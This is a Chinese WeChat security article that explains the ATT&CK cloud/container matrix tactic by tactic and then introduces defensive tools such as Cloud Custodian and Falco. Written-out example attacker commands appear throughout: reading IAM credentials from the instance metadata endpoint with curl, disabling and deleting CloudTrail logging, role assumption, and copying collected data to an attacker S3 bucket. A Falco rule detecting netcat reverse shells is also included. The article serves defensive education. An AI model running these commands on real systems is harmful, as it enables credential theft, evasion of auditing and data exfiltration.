#  安全运营内刊｜ATT&CK之容器安全矩阵初探

[ 天融信安全服务 ](javascript:void\(0\);)

**天融信安全服务** ![]()

微信号 Topsec-anfu

功能介绍 解析网安动态，提供可落地解决方案，关注攻防研究、项目管理、系统安全等。

____

__

收录于话题

![](https://gitee.com/fuli009/images/raw/master/public/20210915182128.png)

  

**01**

 **前言**

  

MITRE在2013年推出了ATT&CK模型，将已知攻击者行为转换为结构化列表，汇总成战术和技术，相当全面地呈现了攻击者在攻击网络时所采用的行为，因此得到了广泛关注。

本文将介绍MITRE
ATT&CK框架的IaaS矩阵部分，以及ATT&CK如何帮助用户识别与云环境相关的威胁并保护用户的云基础设施。这也是很多安全研究人员关注的内容。

![](https://gitee.com/fuli009/images/raw/master/public/20210915182132.png)

  

 **02**

 **IaaS ATT &CK矩阵与Enterprise（企业）ATT&CK矩阵区别**

  

与企业ATT&CK矩阵不同，新的IaaSATT&CK矩阵是企业ATT&CK矩阵的子集，如下图：

![](https://gitee.com/fuli009/images/raw/master/public/20210915182133.png)

ATT＆CK容器矩阵有助于了解与容器相关的风险，包括配置问题（通常是攻击的初始向量）以及在野攻击技术的具体实施。目前，越来越多的公司采用容器和容器编排技术（例如Kubernetes），ATT＆CK容器矩阵介绍了检测容器威胁的方法，有助于提供全面的保护。下面我们将介绍ATT&CK框架中针对容器安全新增加的技术。

  

 **03**

 **IaaS ATT &CK矩阵**

  

 **第1类：初始访问**  

  

初始访问战术包括所有用于获得资源访问权限的攻击技术。在容器化环境中，这些技术可以实现对集群的初始访问。这种访问可以直接通过集群管理工具来实现，也可以通过获得对部署在集群上的恶意软件或脆弱资源的访问来实现。除此之外，攻击者还可以使用社会工程学（如鱼叉式网络钓鱼）在环境中找到突破口。

例如利用存在Struts2
s2-061漏洞的攻击容器，通过发送此精心编制的HTTP请求，可以启动一个反向shell，实现“云横向移动”，并从中攻击整个云基础设施：

![](https://gitee.com/fuli009/images/raw/master/public/20210915182135.png)

值得注意的是，初始访问还可以通过Github等第三方来实现，如果泄漏的凭证被恶意利用，可能会导致用户上层的资源（如ECS）被攻击者控制。

  

 **第2类：执行**  

  

执行是指攻击者用来在集群内运行其代码的技术。如下图，可以看到攻击者如何欺骗用户在其环境中部署恶意镜像：

![](https://gitee.com/fuli009/images/raw/master/public/20210915182136.png)

在这种方法中，攻击者可以使用合法的镜像，如操作系统镜像（如Ubuntu）作为后门容器，将包含后门的镜像上传到公共存储库，并通过使用"kubectl exec
"远程运行其恶意代码，直接获取环境的访问权限。

  

 **第3类：持久性**  

  

持久化战术是指攻击者用来保持对集群持久访问的技术。下面展示了一个不太安全的云配置示例。在此情况下攻击者可以向用户附加内联策略，获得所有权限，以防止该账号从组中被删除，进而实现持久化。

  *   *   *   *   *   *   * 

    
    
     "Version": "2012-10-17",  "Statement": {    "Effect": "Allow",    "Action": "iam:*",    "Resource": "*"  }}

一旦攻击者在持久化阶段取得成功，他们就能够自由访问云环境或云环境中的其他资源，无需执行初始打点的第一步。

  

 **第4类：权限提升**  

  

权限提升是攻击者获得云帐户更高级别权限的操作。

攻击者可以使用常见的提权技术，提升在整个云帐户中的权限。也可以根据实际权限冒充高权限用户，并找到获得更多权限的方法。如下：

  * 

    
    
    aws sts assume-role --role-arn "arn:aws:iam::720870426021:role/dev-EC2Full" --role-session-name AWSCLI-Session

  

 **第5类：防御绕过**  

  

防御绕过战术包括攻击者用来逃避检测和隐藏其活动的技术。例如，关闭审计日志或其他合规性审计并更改管理功能，以免检测到他们在集群中的活动。

攻击者可以使用以下cli命令来禁用或删除CloudWatch和cloudTrail的关键功能：

  *   *   *   * 

    
    
    aws cloudtrail stop-logging --name TrailLogsaws cloudtrail delete-trail --name TrailLogsaws cloudwatch disable-alarm-actions --alarm-names lambdaAlarmaws cloudwatch delete-alarms --alarm-names lambdaAlarm

  

 **第6类：凭证访问**  

  

凭证访问战术包括攻击者用来窃取凭证的一系列技术。这些凭证提供对云环境中系统和服务的访问或控制。获取凭据的技术包括暴力破解、查找并获取不安全存储的凭据等。

![](https://gitee.com/fuli009/images/raw/master/public/20210915182138.png)

通过使用云实例元数据API，可以找到登陆凭证和敏感信息。使用以下命令可以找到AWS的登录凭证，这些凭证是给群集节点相关角色来使用的。

    
    
    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/nodes.darcorp-prod.com

  

 **第7类：发现**  

  

发现战术是攻击者用来探索他们获得环境访问权限的技术。这种探索有助于攻击者进行横向移动并获得对额外资源的访问权限。

  

这一类中使用的是系统、应用程序和网络中常用的发现技术，还包括一些特定的技术如S3、Lambda或route53。

如下，攻击者可以使用合法的cli命令列出云帐户中可用的服务：

  *   *   *   *   * 

    
    
    aws iam list-rolesaws iam list-usersaws iam list-attached-role-policies —role-name nodes.darcorp-prod.comaws emr list-instances --cluster-id j-3C6XNQ39VR9WLaws s3 ls

  

 **第8类：收集**  

  

在这个阶段，攻击者使用的技术可能会有所不同。为了收集信息，攻击者经常使用自动收集内部数据的技术来加速操作。下面的屏幕截图是一个真实案例，攻击者试图从蜜罐中的容器收集配置文件和机密信息：

![](https://gitee.com/fuli009/images/raw/master/public/20210915182139.png)

  

 **第9类：数据窃取**  

  

指攻击者使用MITRE ATT&CK框架技术窃取数据，并将其发送到受攻击者控制的目标上，可能是本地存储，也可能是其他云帐户。

下面的代码演示了攻击者试图通过ssh将收集到的所有数据复制到自己的计算机上，该计算机可能托管在云环境中。

![](https://gitee.com/fuli009/images/raw/master/public/20210915182140.png)

攻击者也可以使用云存储来窃取数据。以下命令使用S3 bucket复制以前收集的所有文件，并将其保存在自己的S3 bucket中。

  * 

    
    
    aws s3 cp /tmp/collected s3://asfsdfsdf/stealed --recursive

  

 **第10类：影响**  

  

包括攻击者用来劫持或破坏正常应用可用性或损害数据完整性，从而实现其最终目标的技术。本节中使用的经典技术包括拒绝服务（DoS）和销毁或篡改数据。如果攻击者决定删除整个基础结构，受害者可能需要数月甚至更长的时间才能恢复。

![](https://gitee.com/fuli009/images/raw/master/public/20210915182142.png)

  

 **04**

 **IaaS ATT &CK矩阵与云安全防护**

  

当我们研究云安全时会发现，云基础设施配置不当仍然是对企业云安全相当大的威胁。云环境中的错误配置包括将S3
bucket向公众开放，或向用户授予不必要的权限等。这些是最容易被攻击者利用的漏洞之一。攻击者借此能够横向移动、入侵并控制云帐户。

  

 **4.1  ** **云供应商的云安全工具**

  

首先是启用日志审计，跟踪云基础设施中发生的一切。如果有人创建用户、更改权限或创建新实例，在这些日志中都可以跟踪到。

每个云供应商都有自己的安全解决方案。例如AWS的CloudTrail、GCP中的云审计日志和Azure的审计日志。与云的微服务性质一样，这些服务都集成在云供应商提供的安全工具中，用以处理、显示和生成告警。这些日志与第三方安全工具集成也很方便，拓展性很强。

  

 **4.2  ** **开源云安全工具**

  

开源工具是网络安全团队武器库中必不可少的利器。下面介绍几种不同类型的开源云安全工具：

  

 **Cloud Custodian**  

  

Cloud
Custodian是一款云安全态势管理（CSPM）工具。CSPM能够对基础设施安全配置进行分析与管理。这些安全配置包括账号特权、网络和存储配置、以及安全配置（如加密设置）。例如，可以检查错误配置，如公共S3
bucket：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    policies:  - name: s3-deny-public-object-acl-poll    resource: s3    actions:      - type: set-statements        statements:           - Sid: "DenyS3PublicObjectACL"             Effect: "Deny"             Action: "s3:PutObjectAcl"             NotPrincipal:               [...]             Resource:                - "arn:aws:s3:::{bucket_name}/*"                - "arn:aws:s3:::{bucket_name}"             Condition:               StringEqualsIgnoreCaseIfExists:                  's3:x-amz-acl':                      - "public-read"                      - "public-read-write"                      - "authenticated-read"

上面是Cloud Custodian规则的一部分，该规则阻止将S3 bucket公开。

  

 **Falco**  

  

Falco
就是为云原生容器安全而生，可以通过灵活的规则引擎来描述任何类型的主机或者容器的行为和活动，在触发策略规则后可以实时发出警报告警，同时支持将告警集成到各种工作流或者告警通道；同时
Falco 可利用最新的检测规则针对恶意活动和 CVE 漏洞发出警报，而且规则可以实现动态更新和开箱即用。

以下规则用于检测远程连接shell：

  *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    - rule: Netcat Remote Code Execution in Container  desc: Netcat Program runs inside container that allows remote code execution  condition: >    spawned_process and container and    ((proc.name = "nc" and (proc.args contains "-e" or proc.args contains "-c")) or     (proc.name = "ncat" and (proc.args contains "--sh-exec" or proc.args contains "--exec" or proc.args contains "-e "                              or proc.args contains "-c " or proc.args contains "--lua-exec"))    )  output: >    Netcat runs inside container that allows remote code execution (user=%user.name    command=%proc.cmdline container_id=%container.id container_name=%container.name image=%container.image.repository:%container.image.tag)  priority: WARNING  tags: [network, process, mitre_execution]

  

 **05**

 **结论**

  

ATT&CK容器矩阵涵盖了编排层（例如Kubernetes）和容器层（例如Docker）的攻击行为，还包括了一系列与容器相关的恶意软件。容器安全性是一个广泛的问题，理解容器ATT&CK矩阵是构建容器安全能力的重要一步。

  

原文链接：https://sysdig.com/blog/what-is-mitre-attck-for-cloud-iaas/

声明：

1．本文档由天融信安全团队发布，未经授权禁止第三方转载及转投。

2．本文档所提到的技术内容及资讯仅供参考，有关内容可能会随时更新，天融信不另行通知。

3．本文档中提到的信息为正常公开的信息，若因本文档或其所提到的任何信息引起了他人直接或间接的资料流失、利益损失，天融信及其员工不承担任何责任。

![](https://gitee.com/fuli009/images/raw/master/public/20210915182143.png)

  

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![示意图](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

安全运营内刊｜ATT&CK之容器安全矩阵初探

最多200字，当前共字

__

发送中

写下你的留言

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。 视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

